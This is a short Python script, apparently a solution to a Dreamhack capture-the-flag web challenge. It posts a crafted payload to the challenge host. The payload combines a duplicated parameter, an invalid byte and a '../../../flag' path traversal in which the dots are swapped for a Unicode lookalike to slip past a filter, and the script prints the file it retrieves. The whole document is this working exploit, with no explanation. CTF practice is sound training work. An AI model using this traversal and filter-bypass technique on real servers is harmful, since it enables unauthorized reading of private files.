import requests

url = "http://host3.dreamhack.games:19139/"

payload = f"p=a&p=%ff/../../../flag".replace('.', '\u022e')

res = requests.post(url, headers={'Content-Type': 'text/plain'}, data=payload)

print("Flag:", res.text)